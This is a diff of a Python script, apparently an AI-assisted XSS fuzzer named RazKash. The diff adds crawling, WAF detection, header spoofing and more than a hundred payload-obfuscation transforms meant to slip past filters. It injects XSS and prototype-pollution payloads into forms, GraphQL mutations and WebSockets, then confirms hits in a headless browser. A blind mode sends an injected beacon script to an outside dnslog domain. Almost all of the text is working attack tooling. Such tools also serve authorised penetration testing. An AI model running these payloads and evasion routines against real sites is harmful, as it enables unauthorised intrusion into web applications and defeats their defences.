@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 # =============================================================================
-# RazKash 𝕏SS AI Fuzzer · (Red Team + SOC Version)  
-# Version: 2025-05-10, v9.2 Enterprise
+# RazKash 𝕏SS AI Fuzzer · v9.2 Enterprise (2025-05-10)
 # Author : Haroon Ahmad Awan · CyberZeus (mrharoonawan@gmail.com)
 # =============================================================================
 
@@ -37,7 +36,7 @@ from transformers import AutoTokenizer, AutoModelForMaskedLM, logging as hf_log
 
 # Optional: Playwright & websocket
 try:
-    from playwright.sync_api import sync_playwright, Request as PWReq
+    from playwright.sync_api import sync_playwright
 except ImportError:
     sync_playwright = None
 
@@ -50,7 +49,7 @@ except ImportError:
 #                              CONFIG
 # ─────────────────────────────────────────────────────────────────────────────
 
-VER               = "9.2-omni-enterprise (2025-05-10, merged build)"
+VER               = "9.2-omni-enterprise (SUPER DYNAMIC)"
 MODEL             = "microsoft/codebert-base"
 DNSLOG_DOMAIN     = "ugxllx.dnslog.cn"
 LOGFILE           = Path("razkash_findings.md")
@@ -81,27 +80,27 @@ WAF_SPOOF_HEADERS = [
 #                              ARGUMENTS
 # ─────────────────────────────────────────────────────────────────────────────
 
-ap = argparse.ArgumentParser(description="RazKash v9.2-omni-enterprise · Ultimate AI XSS Omnifuzzer")
+ap = argparse.ArgumentParser(description="RazKash v9.2 SUPER DYNAMIC XSS Fuzzer")
 mx = ap.add_mutually_exclusive_group()
-mx.add_argument("--reflected", action="store_true", help="Only reflected XSS")
-mx.add_argument("--stored",    action="store_true", help="Only stored XSS")
-mx.add_argument("--blind",     action="store_true", help="Only blind XSS")
-mx.add_argument("--invent",    action="store_true", help="Invent new AI-driven payloads (add 'MASK' placeholder)")
-ap.add_argument("-u","--url",      help="Target root URL")
-ap.add_argument("--autotest",      action="store_true", help="Use built-in vulnerable labs for quick testing")
-ap.add_argument("--login-url",     help="Optional login endpoint URL")
-ap.add_argument("--username",      help="Optional username for login")
-ap.add_argument("--password",      help="Optional password for login")
-ap.add_argument("--csrf-field",    default="csrf", help="CSRF field name (for form-based login)")
-ap.add_argument("--threads",       type=int, default=DEF_THREADS, help="Number of fuzzing threads")
-ap.add_argument("--max-pages",     type=int, default=MAX_STATIC_PAGES, help="Max static pages to crawl")
-ap.add_argument("--nested-depth",  type=int, default=MAX_NESTED_DEPTH, help="Max depth for nested iframes")
-ap.add_argument("--simulate-spa",  action="store_true", help="Simulate SPA by clicking links (Playwright)")
-ap.add_argument("--crawl-iframes", action="store_true", help="Crawl iframes as well")
-ap.add_argument("--detect-waf",    action="store_true", help="Enable passive WAF detection attempt")
-ap.add_argument("--polymorph",     action="store_true", help="Obfuscate payloads with random transformations")
-ap.add_argument("--headed",        action="store_true", help="Run Playwright in headed mode for XSS popups")
-ap.add_argument("--debug",         action="store_true", help="Enable debug logging")
+mx.add_argument("--reflected", action="store_true", help="Test only reflected XSS")
+mx.add_argument("--stored",    action="store_true", help="Test only stored XSS")
+mx.add_argument("--blind",     action="store_true", help="Test only blind XSS")
+mx.add_argument("--invent",    action="store_true", help="AI-driven payload placeholders (MASK)")
+ap.add_argument("-u","--url",           help="Target root URL")
+ap.add_argument("--autotest",           action="store_true", help="Use built-in labs")
+ap.add_argument("--login-url",          help="Login endpoint")
+ap.add_argument("--username",           help="Login username")
+ap.add_argument("--password",           help="Login password")
+ap.add_argument("--csrf-field",         default="csrf", help="CSRF field name")
+ap.add_argument("--threads",            type=int, default=DEF_THREADS)
+ap.add_argument("--max-pages",          type=int, default=MAX_STATIC_PAGES)
+ap.add_argument("--nested-depth",       type=int, default=MAX_NESTED_DEPTH)
+ap.add_argument("--simulate-spa",       action="store_true")
+ap.add_argument("--crawl-iframes",      action="store_true")
+ap.add_argument("--detect-waf",         action="store_true")
+ap.add_argument("--polymorph",          action="store_true", help="Use random obfuscation transformations")
+ap.add_argument("--headed",             action="store_true", help="Headed browser mode (Playwright)")
+ap.add_argument("--debug",              action="store_true", help="Debug logging")
 args = ap.parse_args()
 DEBUG = args.debug
 
@@ -134,16 +133,17 @@ def session_splice():
 def rate_limit():
     time.sleep(RATE_LIMIT_SLEEP)
 
-def smart_url(u: str) -> str:
-    if u.startswith(("http://","https://")):
-        return u
-    for p in ("https://","http://"):
+def smart_url(raw: str) -> str:
+    if raw.startswith(("http://","https://")):
+        return raw
+    for scheme in ("https://","http://"):
         try:
-            if requests.head(p+u, timeout=3, verify=False).status_code < 500:
-                return p+u
+            r = requests.head(scheme + raw, timeout=3, verify=False)
+            if r.status_code < 500:
+                return scheme + raw
         except:
             pass
-    return "http://" + u
+    return "http://" + raw
 
 def random_headers() -> Dict[str,str]:
     ua = UserAgent()
@@ -174,33 +174,709 @@ def ai_mutate(template: str) -> str:
     return s
 
 # ─────────────────────────────────────────────────────────────────────────────
-#                       POLYMORPHIC OBFUSCATION
+#                           SUPER ADVANCED OBFUSCATION
 # ─────────────────────────────────────────────────────────────────────────────
 
 obfuscation_methods = [
+
+    # 1) No change
     lambda p: p,
+
+    # 2) \xHH
     lambda p: "".join(f"\\x{ord(c):02x}" for c in p) if p else p,
+
+    # 3) \uHHHH
     lambda p: "".join(f"\\u{ord(c):04x}" for c in p) if p else p,
+
+    # 4) base64
     lambda p: base64.b64encode(p.encode()).decode(errors='ignore') if p else p,
-    lambda p: p.encode('utf-16').decode(errors='ignore') if p else p,
-    lambda p: codecs.encode(p, 'rot_13') if p else p,
+
+    # 5) utf-16 decode
+    lambda p: p.encode('utf-16','ignore').decode('utf-16','ignore') if p else p,
+
+    # 6) rot13
+    lambda p: codecs.encode(p,'rot_13') if p else p,
+
+    # 7) url-encode
     lambda p: urllib.parse.quote(p) if p else p,
+
+    # 8) HTML-escape < >
     lambda p: p.replace('<','&lt;').replace('>','&gt;') if p else p,
+
+    # 9) HTML-escape quotes
     lambda p: p.replace('"','&quot;').replace("'",'&#39;') if p else p,
+
+    # 10) slash-escape
     lambda p: "".join(f"\\{c}" for c in p) if p else p,
+
+    # 11) %HH
     lambda p: "".join(f"%{ord(c):02X}" for c in p) if p else p,
+
+    # 12) &#xHH;
     lambda p: "".join(f"&#x{ord(c):X};" for c in p) if p else p,
+
+    # 13) &#DD;
     lambda p: "".join(f"&#{ord(c)};" for c in p) if p else p,
+
+    # 14) Insert /**/
     lambda p: "".join(f"{c}/**/" for c in p) if p else p,
+
+    # 15) Reverse
     lambda p: p[::-1] if p else p,
+
+    # 16) Uppercase
     lambda p: p.upper() if p else p,
+
+    # 17) Lowercase
     lambda p: p.lower() if p else p,
+
+    # 18) Swapcase
     lambda p: p.swapcase() if p else p,
+
+    # 19) Remove null
     lambda p: p.replace('\x00','') if p else p,
+
+    # 20) Double-URL-encode
+    lambda p: urllib.parse.quote(urllib.parse.quote(p)) if p else p,
 ]
 
-def polymorph(payload: str) -> str:
-    return random.choice(obfuscation_methods)(payload)
+def _expand_obf():
+    extra = []
+
+    def encode_to_utf32_le(s):
+        try:
+            return s.encode('utf-32-le','ignore').decode('latin-1','ignore')
+        except:
+            return s
+
+    def double_rot13(s):
+        # ROT13 twice is original, but let's do triple to shift again
+        return codecs.encode(codecs.encode(codecs.encode(s, 'rot_13'), 'rot_13'),'rot_13')
+
+    # We'll create a bunch of transformations
+    expansions = [
+        lambda p: "".join(f"\\0{oct(ord(c))[2:]}" for c in p) if p else p,
+        lambda p: "".join(f"\\u{{{ord(c):04x}}}" for c in p) if p else p,
+        lambda p: "".join(f"&#x{ord(c):04x};" for c in p) if p else p,
+        lambda p: base64.urlsafe_b64encode(p.encode()).decode('ascii','ignore') if p else p,
+        lambda p: encode_to_utf32_le(p) if p else p,
+        lambda p: "".join(chr((ord(c)+1) % 256) for c in p) if p else p,  # shift each char +1
+        lambda p: "".join(chr((ord(c)-1) % 256) for c in p) if p else p,  # shift -1
+        lambda p: double_rot13(p) if p else p,  # triple rot13 example
+        lambda p: p.replace("<","＜").replace(">","＞") if p else p,
+        lambda p: re.sub(r"[aeiouAEIOU]", lambda m: m.group(0)+"\u200B", p) if p else p, 
+        lambda p: codecs.encode(p,"hex_codec").decode('ascii') if p else p,
+        lambda p: p[::-1].upper() if p else p,
+        lambda p: "‼".join(p) if p else p,   # insert a weird char between each letter
+        lambda p: "".join(f"\\U0000{ord(c):04X}" for c in p) if p else p,
+        lambda p: p.replace("<","%3C").replace(">","%3E") if p else p,
+        lambda p: "".join(c for c in p if c.isalnum()) if p else p,  # remove non-alnum
+        lambda p: p.replace(" ","%20") if p else p,
+        lambda p: p.replace(" ","\t") if p else p,
+        lambda p: " ".join(reversed(p.split())) if p else p, 
+        lambda p: "".join("\\x"+hex(ord(c))[2:].zfill(2)+"\\" for c in p) if p else p,
+        lambda p: "\u202E"+p+"\u202C" if p else p,  # Use RTL override
+    ]
+
+    all_variants = expansions * 10  # expansions repeated to get ~100
+    for i in range(100):
+        all_variants.append(lambda p, i=i: p+"<!--rand"+str(i)+"-->" if p else p)
+    return all_variants
+
+_extra_methods = _expand_obf()
+obfuscation_methods.extend(_extra_methods)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+#                        ERROR DETECTION / PATTERNS
+# ─────────────────────────────────────────────────────────────────────────────
+
+SQL_ERROR_RE = re.compile(r"(SQL syntax|MySQL|syntax error|Error|error|ERROR|unclosed quotation|InnoDB|PostgreSQL)", re.I)
+
+# ─────────────────────────────────────────────────────────────────────────────
+#                            VERIFICATION
+# ─────────────────────────────────────────────────────────────────────────────
+
+def verify(url: str, method: str, data: Any, is_json: bool=False) -> bool:
+    """
+    Launches a headless or headed browser to see if any script 
+    event (alert, confirm, prompt, CSP violation, or DOM mutation) was triggered.
+    Captures screenshot + optional video for visual proof.
+    """
+    if not sync_playwright:
+        return False
+    try:
+        screenshot_dir = Path("screenshots")
+        screenshot_dir.mkdir(exist_ok=True)
+
+        with sync_playwright() as p:
+            bw = p.chromium.launch(
+                headless=not args.headed,
+                args=[
+                    "--disable-web-security",
+                    "--ignore-certificate-errors",
+                    "--no-sandbox"
+                ]
+            )
+
+            # Record video (optional)
+            ctx = bw.new_context(
+                ignore_https_errors=True,
+                user_agent=UserAgent().random,
+                record_video_dir=str(screenshot_dir / "videos")
+            )
+
+            page = ctx.new_page()
+
+            page.add_init_script("""
+                window._xss_triggered = false;
+                const mark = () => window._xss_triggered = true;
+
+                // Alert hooks
+                ['alert','confirm','prompt'].forEach(fn => {
+                    const o = window[fn];
+                    window[fn] = (...a) => { mark(); return o(...a); };
+                });
+
+                // CSP hook
+                document.addEventListener('securitypolicyviolation', mark);
+
+                // DOM MutationObserver
+                const mo = new MutationObserver(() => mark());
+                mo.observe(document.body, {childList: true, subtree: true});
+
+                // Delayed race injection
+                setTimeout(() => {
+                    const img = document.createElement("img");
+                    img.src = "x";
+                    img.onerror = () => { mark(); };
+                    document.body.appendChild(img);
+                }, 500);
+            """)
+
+            page.on("dialog", lambda d: (d.dismiss(), page.evaluate("window._xss_triggered = true")))
+
+            # Navigate and send data
+            if method.upper() == "GET":
+                q = urllib.parse.urlencode(data)
+                page.goto(f"{url}?{q}", timeout=VERIFY_TIMEOUT, wait_until="networkidle")
+            else:
+                page.goto(url, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
+                hdr = {"Content-Type": "application/json"} if is_json else {"Content-Type": "application/x-www-form-urlencoded"}
+                body = json.dumps(data) if is_json else urllib.parse.urlencode(data)
+                page.evaluate("(u,h,b)=>fetch(u,{method:'POST',headers:h,body:b})", url, hdr, body)
+
+            page.wait_for_timeout(HEADLESS_WAIT + 1000)
+
+            # Screenshot
+            fname = f"{randstr(10)}.png"
+            page.screenshot(path=str(screenshot_dir / fname), full_page=True)
+
+            hit = page.evaluate("window._xss_triggered")
+            ctx.close()
+            bw.close()
+
+            if hit:
+                dbg(f"[verify] XSS triggered, screenshot saved → screenshots/{fname}")
+            return bool(hit)
+
+    except Exception as ex:
+        dbg(f"[verify] {ex}")
+        return False
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+#                               LOGGING
+# ─────────────────────────────────────────────────────────────────────────────
+
+if not LOGFILE.exists():
+    LOGFILE.write_text(f"# RazKash Findings v{VER}\n\n", "utf-8")
+
+_hits = set()
+log_lock = threading.Lock()
+
+def log_hit(url, method, payload, params=None):
+    params = params or []
+    entry = f"- **XSS** {method} `{url}` param={params} payload=`{payload}`\n"
+    with log_lock:
+        if entry in _hits:
+            return
+        _hits.add(entry)
+        LOGFILE.write_text(LOGFILE.read_text("utf-8") + entry, "utf-8")
+    logging.info(entry.strip())
+
+# ─────────────────────────────────────────────────────────────────────────────
+#                          SESSION / AUTH
+# ─────────────────────────────────────────────────────────────────────────────
+
+def get_authenticated_session():
+    s = requests.Session()
+    if args.login_url and args.username and args.password:
+        if args.login_url.endswith("/rest/user/login"):
+            # JSON-based login
+            h = random_headers()
+            h["Content-Type"] = "application/json"
+            try:
+                r = s.post(args.login_url, json={"email": args.username,"password": args.password},
+                           headers=h, timeout=HTTP_TIMEOUT, verify=False)
+                j = r.json()
+                token = j.get("token") or j.get("authentication",{}).get("token")
+                if token:
+                    s.headers.update({"Authorization": f"Bearer {token}"})
+            except:
+                pass
+        else:
+            # HTML form-based
+            r0 = s.get(args.login_url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
+            csrf_val = re.search(f'name="{args.csrf_field}" value="([^"]+)"', r0.text)
+            data={}
+            if csrf_val:
+                data[args.csrf_field]=csrf_val.group(1)
+            data.update({"username": args.username,"password": args.password})
+            s.post(args.login_url, data=data, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
+
+    s.mount("https://", HTTPAdapter(pool_connections=50, pool_maxsize=50))
+    s.mount("http://",  HTTPAdapter(pool_connections=50, pool_maxsize=50))
+    return s
+
+SESSION = get_authenticated_session()
+
+# ─────────────────────────────────────────────────────────────────────────────
+#                            GRAPHQL INTROSPECTION
+# ─────────────────────────────────────────────────────────────────────────────
+
+INTROSPECTION = """ query IntrospectionQuery {
+  __schema {
+    queryType { name }
+    mutationType { name }
+    types {
+      kind name
+      fields {
+        name
+        args {
+          name
+          type {
+            kind
+            name
+            ofType { kind }
+          }
+        }
+      }
+    }
+  }
+}
+"""
+
+def discover_graphql_ops(ep):
+    try:
+        resp = SESSION.post(ep, json={"query":INTROSPECTION}, timeout=HTTP_TIMEOUT, verify=False)
+        j = resp.json()
+        sch = j["data"]["__schema"]
+        ops = []
+        for kind in ("queryType","mutationType"):
+            root = sch.get(kind)
+            if not root:
+                continue
+            for t in sch["types"]:
+                if t["name"]==root["name"]:
+                    for f in t["fields"]:
+                        arg_names = [a["name"] for a in f["args"] if a["type"]["name"]=="String"]
+                        if arg_names:
+                            ops.append((f["name"],arg_names))
+        return ops
+    except:
+        return []
+
+def fuzz_graphql(ep):
+    for name, args_ in discover_graphql_ops(ep):
+        for a in args_:
+            payload = "<img src=x onerror=alert(1)>"
+            try:
+                r = SESSION.post(ep,
+                    json={"query":f"mutation{{{name}({a}:\"{payload}\"){{__typename}}}}"},
+                    timeout=HTTP_TIMEOUT, verify=False
+                )
+                dbg(f"[graphql] fuzzing {name}({a}) -> HTTP {r.status_code}")
+            except Exception as ex:
+                dbg(f"[graphql fuzz] {ex}")
+
+# ─────────────────────────────────────────────────────────────────────────────
+#                            CRAWLING
+# ─────────────────────────────────────────────────────────────────────────────
+
+def mine_js(url,host):
+    found = []
+    try:
+        r = SESSION.get(url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
+        txt = r.text
+        # Advanced pattern coverage with recursion
+        js_call_re = re.compile(
+            r'(?:fetch\(["\']|axios\.\w+\(["\']|XHR\.open\(["\'](?:GET|POST)["\'],\s*|WebSocket\(["\']|import\(["\'])'
+            r'(/[^"\']+\.(?:js|php|asp|aspx|jsp|cgi|json|graphql|py|pl|rb|html|htm|dll|action)(?:\?[^"\']*)?)["\']',
+            re.IGNORECASE
+        )
+        js_url_re = re.compile(
+            r'["\'](/[^"\']+\.(?:js|php|asp|aspx|jsp|cgi|json|graphql|py|pl|rb|html|htm|dll|action)(?:\?[^"\']*)?)["\']|'
+            r'["\'](/(?:api|ajax|rest)/[^"\']+)["\']|'
+            r'window\.location\s*=\s*["\'](/[^"\']+)["\']|'
+            r'document\.location\s*=\s*["\'](/[^"\']+)["\']',
+            re.IGNORECASE
+        )
+
+        found_calls = js_call_re.findall(txt)
+        for c in found_calls:
+            if isinstance(c, str):
+                found.append(c)
+            elif isinstance(c, tuple):
+                for i in c:
+                    if i: found.append(i)
+
+        for match in js_url_re.findall(txt):
+            for m in match:
+                if m:
+                    found.append(m)
+
+    except Exception as e:
+        dbg(f"[mine_js error] {e}")
+
+    out = set()
+    js_links = []
+
+    for u in found:
+        full = urllib.parse.urljoin(url, u)
+        if urllib.parse.urlparse(full).netloc.lower() == host:
+            out.add(full)
+            if full.lower().endswith(".js"):
+                js_links.append(full)
+
+    # Recursively parse each JS file
+    for js_url in js_links:
+        try:
+            r = SESSION.get(js_url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
+            js_txt = r.text
+
+            js_inner_re = re.compile(
+                r'["\'](/[^"\']+\.(?:php|asp|aspx|jsp|cgi|json|graphql|py|pl|rb|html|htm|dll|action)(?:\?[^"\']*)?)["\']|'
+                r'["\'](/(?:api|ajax|rest)/[^"\']+)["\']',
+                re.IGNORECASE
+            )
+            for match in js_inner_re.findall(js_txt):
+                for m in match:
+                    if m:
+                        full = urllib.parse.urljoin(js_url, m)
+                        if urllib.parse.urlparse(full).netloc.lower() == host:
+                            out.add(full)
+        except Exception as e:
+            dbg(f"[recursive js parse error] {e}")
+
+    return list(out)
+
+
+def misc_assets(root):
+    base = urllib.parse.urlparse(root)._replace(path="",query="",fragment="").geturl()
+    assets=[]
+    try:
+        # try robots
+        txt = SESSION.get(base+"/robots.txt", headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False).text
+        for line in txt.splitlines():
+            if line.lower().startswith("sitemap:"):
+                assets.append(line.split(":",1)[1].strip())
+    except:
+        pass
+    return assets
+
+def crawl_static(root,cap,depth=0):
+    visited=set()
+    queue=[root]+misc_assets(root)
+    targets=[]
+    host=urllib.parse.urlparse(root).netloc.lower()
+    while queue and len(visited)<cap:
+        u=queue.pop(0)
+        if u in visited:
+            continue
+        visited.add(u)
+        try:
+            r=SESSION.get(u, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
+        except:
+            continue
+        ct=r.headers.get("content-type","").lower()
+        if "javascript" in ct:
+            # parse sub-requests
+            for jurl in mine_js(u,host):
+                if jurl not in visited:
+                    queue.append(jurl)
+            continue
+        if "html" not in ct:
+            continue
+        soup=BeautifulSoup(r.text,"html.parser")
+        if args.crawl_iframes and depth<args.nested_depth:
+            for ifr in soup.find_all("iframe", src=True):
+                src=urllib.parse.urljoin(u, ifr["src"])
+                if urllib.parse.urlparse(src).netloc.lower()==host:
+                    queue.append(src)
+        for sc in soup.find_all("script", src=True):
+            scr=urllib.parse.urljoin(u, sc["src"])
+            if urllib.parse.urlparse(scr).netloc.lower()==host:
+                queue.append(scr)
+
+        for a in soup.find_all("a", href=True):
+            link=urllib.parse.urljoin(u,a['href'])
+            pu=urllib.parse.urlparse(link)
+            if pu.netloc.lower()!=host:
+                continue
+            if link not in visited:
+                queue.append(link)
+            if pu.query:
+                qs=list(urllib.parse.parse_qs(pu.query).keys())
+                targets.append({"url":pu._replace(query="").geturl(),"method":"GET","params":qs})
+
+        for f in soup.find_all("form"):
+            act=urllib.parse.urljoin(u,f.get("action") or u)
+            if urllib.parse.urlparse(act).netloc.lower()!=host:
+                continue
+            mth=f.get("method","get").upper()
+            ps=[i.get("name") for i in f.find_all(["input","textarea","select"]) if i.get("name")]
+            if ps:
+                targets.append({"url":act,"method":mth,"params":ps})
+
+    return targets
+
+def crawl_dynamic(root):
+    if not sync_playwright:
+        return []
+    found=[]
+    seen=set()
+    host=urllib.parse.urlparse(root).netloc.lower()
+
+    try:
+        with sync_playwright() as p:
+            br = p.chromium.launch(headless=not args.headed, args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"])
+            ctx=br.new_context(ignore_https_errors=True, user_agent=UserAgent().random)
+            page=ctx.new_page()
+            def on_req(req):
+                u=req.url
+                if urllib.parse.urlparse(u).netloc.lower()!=host or u in seen:
+                    return
+                seen.add(u)
+                m=req.method.upper()
+                hd=req.headers.get("content-type","").lower()
+                is_json=("json" in hd or "graph" in hd)
+                try:
+                    data=json.loads(req.post_data or "{}")
+                except:
+                    data={}
+                qs=list(urllib.parse.urlparse(u).query.split("&")) if "?" in u else []
+                if data:
+                    param_names=list(data.keys())
+                else:
+                    param_names=[x.split("=")[0] for x in qs if x] or ["payload"]
+                found.append({
+                    "url":u.split("?",1)[0],
+                    "method":m if m in ("POST","PUT") else "GET",
+                    "params":param_names,
+                    "json":is_json,
+                    "template":data
+                })
+
+            page.on("request", on_req)
+            page.goto(root, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
+            time.sleep(1)
+            ctx.close()
+            br.close()
+    except Exception as e:
+        dbg(f"[crawl_dynamic] {e}")
+    return found
+
+# ─────────────────────────────────────────────────────────────────────────────
+#                          FUZZING
+# ─────────────────────────────────────────────────────────────────────────────
+
+static_exts = {
+    "png","jpg","jpeg","gif","bmp","svg","webp","ico","css","woff","woff2","ttf",
+    "eot","otf","mp4","mp3","webm","pdf","zip","rar","7z","tar","gz"
+}
+
+def set_deep(obj:Any, path:str, val:Any):
+    parts = re.split(r'\.|(\[\d+\])', path)
+    parts = [p for p in parts if p and p.strip()]
+    cur=obj
+    for i, part in enumerate(parts):
+        is_last=(i==len(parts)-1)
+        if part.startswith('[') and part.endswith(']'):
+            idx=int(part[1:-1])
+            if is_last:
+                cur[idx]=val
+            else:
+                if isinstance(cur[idx],(dict,list)):
+                    cur=cur[idx]
+                else:
+                    cur[idx]={}
+                    cur=cur[idx]
+        else:
+            if is_last:
+                cur[part]=val
+            else:
+                if part not in cur or not isinstance(cur[part],(dict,list)):
+                    cur[part]={}
+                cur=cur[part]
+
+
+def fuzz_http(t:Dict[str,Any]):
+    ext=Path(urllib.parse.urlparse(t["url"]).path).suffix.lstrip('.').lower()
+    if ext in static_exts:
+        return
+    rate_limit()
+    session_splice()
+
+    try:
+        probe={p:"" for p in t["params"]}
+        r0=(SESSION.get if t["method"]=="GET" else SESSION.post)(
+            t["url"],
+            params=probe if t["method"]=="GET" else None,
+            data=probe  if t["method"]=="POST" else None,
+            headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False
+        )
+        if r0.status_code!=200:
+            return
+        if "image" in r0.headers.get("content-type","").lower():
+            return
+    except:
+        return
+
+    # If blind
+    if args.blind and DNSLOG_DOMAIN:
+        templates=[f"<script>new Image().src='http://{DNSLOG_DOMAIN}/?p='+encodeURIComponent('{randstr()}')</script>"]
+    else:
+        templates=PAYLOADS
+
+    for tpl in templates:
+        payload=tpl
+        if "MASK" in payload:
+            payload=ai_mutate(payload)
+        if args.polymorph:
+            payload=random.choice(obfuscation_methods)(payload)
+
+        try:
+            if t.get("json") and "template" in t:
+                body=json.loads(json.dumps(t["template"]))
+                for param in t["params"]:
+                    set_deep(body, param, payload)
+                resp=SESSION.post(
+                    t["url"], json=body,
+                    headers={"Content-Type":"application/json"},
+                    timeout=HTTP_TIMEOUT, verify=False
+                )
+                sent_data=body
+            else:
+                sent_data={p:payload for p in t["params"]}
+                resp=(SESSION.get if t["method"]=="GET" else SESSION.post)(
+                    t["url"],
+                    params=sent_data if t["method"]=="GET" else None,
+                    data=sent_data if t["method"]=="POST" else None,
+                    headers=random_headers(),
+                    timeout=HTTP_TIMEOUT, verify=False
+                )
+            if resp.status_code in (403,429,503) or any(x in resp.text for x in ("captcha","denied","blocked")):
+                continue
+            if SQL_ERROR_RE.search(resp.text):
+                continue
+
+            if args.blind:
+                log_hit(t["url"],"BLIND",payload,t["params"])
+                return
+
+            if verify(t["url"], t["method"], sent_data, t.get("json",False)):
+                log_hit(t["url"], t["method"], payload, t["params"])
+                return
+
+        except Exception as ex:
+            dbg(f"[fuzz_http error] {ex}")
+        jitter()
+
+def fuzz_ws(t:Dict[str,Any]):
+    if not websocket:
+        return
+    if not t["url"].startswith(("ws://","wss://")):
+        return
+    url = t["url"]
+    params = t.get("params", [])
+    tpl = t.get("template") or {}
+    marker = randstr()
+    hit = False
+
+    # Prepare chained payload
+    try:
+        body = json.loads(json.dumps(tpl))
+    except:
+        body = {}
+
+    if body:
+        set_deep(body, random.choice(params), f"<img src=x onerror=alert('{marker}')>")
+    else:
+        if params:
+            body[random.choice(params)] = f"<svg onload=alert('{marker}')></svg>"
+        else:
+            body["payload"] = f"<svg onload=alert('{marker}')></svg>"
+
+    payload = json.dumps(body)
+
+    def on_msg(wsapp, msg):
+        nonlocal hit
+        if marker in msg or "XSS" in msg:
+            hit = True
+
+    try:
+        wsapp = websocket.WebSocketApp(url, on_message=on_msg, header=random_headers())
+        thr = threading.Thread(target=wsapp.run_forever, kwargs={"sslopt": {"cert_reqs": ssl.CERT_NONE}})
+        thr.daemon = True
+        thr.start()
+        time.sleep(1)
+        wsapp.send(payload)
+
+        # Protocol chaining: try a follow-up command
+        chained = json.dumps({"action": "get_status", "req": f"{marker}"})
+        wsapp.send(chained)
+
+        time.sleep(3)
+        wsapp.close()
+
+        if hit:
+            log_hit(url, "WS", f"{payload} -> {chained}", params)
+
+    except Exception as e:
+        dbg(f"[fuzz_ws] {e}")
+
+# ─────────────────────────────────────────────────────────────────────────────
+#                          WAF DETECTION
+# ─────────────────────────────────────────────────────────────────────────────
+
+def detect_waf(url:str)->str:
+    sigs={
+        "cloudflare":["__cf_bm","cf-ray","Cloudflare Ray ID"],
+        "akamai":["AkamaiGHost","akamai"],
+        "sucuri":["sucuri_cloudproxy_uuid","Access Denied - Sucuri"],
+        "imperva":["visid_incap_","incapsula"],
+    }
+    try:
+        r=SESSION.get(url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
+        t=r.text.lower()
+        for n,pats in sigs.items():
+            if any(p.lower() in t for p in pats):
+                return n
+    except:
+        pass
+    return "unknown"
+
+# ─────────────────────────────────────────────────────────────────────────────
+#                              MAIN
+# ─────────────────────────────────────────────────────────────────────────────
+
+AUTOTEST=[
+    "http://xss-game.appspot.com/",
+    "http://xss-game.appspot.com/level1",
+    "https://juice-shop.herokuapp.com/"
+]
+
 
 # ─────────────────────────────────────────────────────────────────────────────
 #                     BASE XSS PAYLOADS + INVENT OPTION
@@ -325,10 +1001,21 @@ stored_payloads = [
     "<img src=x onerror=\"this['al'+'ert']('XSS')\">",
     "<svg onload='fetch(\"data:,\"+String.fromCharCode(97,108,101,114,116,40,49,41))'></svg>",
     "<style>*{background-image:url(\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\")} </style>",
-    "<img src=1 onerror='eval(decodeURIComponent(\"%61%6c%65%72%74%28%31%29\"))'>"
+    "<img src=1 onerror='eval(decodeURIComponent(\"%61%6c%65%72%74%28%31%29\"))'>",
+  
+    "__proto__[alert]=1",
+    '{"__proto__":{"polluted":"yes"}}',
+    "constructor.constructor('alert(1)')()",
+    "Object.prototype.__defineGetter__('x',function(){alert(1)})",
+    '__proto__.toString="alert(1)"'
 ]
     
 BASE_PAYLOADS = [
+    "__proto__[alert]=1",
+    '{"__proto__":{"polluted":"yes"}}',
+    "constructor.constructor('alert(1)')()",
+    "Object.prototype.__defineGetter__('x',function(){alert(1)})",
+    '__proto__.toString="alert(1)"',
     '<script>alert("XSS")</script>',
     '<img src="x" onerror="alert(\'XSS\')" />',
     '<a href="javascript:alert(\'XSS\')">Click Me</a>',
@@ -381,600 +1068,68 @@ if args.invent:
 
 PAYLOADS = BASE_PAYLOADS.copy()
 
-# ─────────────────────────────────────────────────────────────────────────────
-#                        ERROR DETECTION / PATTERNS
-# ─────────────────────────────────────────────────────────────────────────────
-
-SQL_ERROR_RE = re.compile(r"(SQL syntax|MySQL|syntax error|unclosed quotation|InnoDB|PostgreSQL)", re.I)
-
-# ─────────────────────────────────────────────────────────────────────────────
-#                            VERIFICATION
-# ─────────────────────────────────────────────────────────────────────────────
-
-def verify(url: str, method: str, data: Any, is_json: bool=False) -> bool:
-    """
-    Launches a headless or headed browser to detect if any script
-    event (alert, confirm, prompt, etc.) was triggered.
-    """
-    if not sync_playwright:
-        return False
-    try:
-        with sync_playwright() as p:
-            bw = p.chromium.launch(
-                headless=not args.headed,
-                args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"]
-            )
-            ctx = bw.new_context(ignore_https_errors=True, user_agent=UserAgent().random)
-            page = ctx.new_page()
-
-            # Inject a minimal script to detect XSS
-            page.add_init_script("""
-                window._xss_triggered = false;
-                const mark = () => { window._xss_triggered = true; };
-                ['alert','confirm','prompt'].forEach(fn => {
-                    const _orig = window[fn];
-                    window[fn] = (...args) => { mark(); return _orig(...args); };
-                });
-                document.addEventListener('securitypolicyviolation', mark);
-            """)
-            page.on("dialog", lambda d: (d.dismiss(), page.evaluate("window._xss_triggered = true")))
-
-            if method.upper() == "GET":
-                q = urllib.parse.urlencode(data)
-                page.goto(f"{url}?{q}", timeout=VERIFY_TIMEOUT, wait_until="networkidle")
-            else:
-                page.goto(url, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
-                headers = {"Content-Type": "application/json"} if is_json else {"Content-Type": "application/x-www-form-urlencoded"}
-                body    = json.dumps(data) if is_json else urllib.parse.urlencode(data)
-                page.evaluate("(u,h,b) => fetch(u,{method:'POST',headers:h,body:b})", url, headers, body)
-
-            page.wait_for_timeout(HEADLESS_WAIT)
-            hit = page.evaluate("window._xss_triggered")
-            ctx.close()
-            bw.close()
-            return bool(hit)
-    except Exception as ex:
-        dbg(f"[verify] {ex}")
-        return False
-
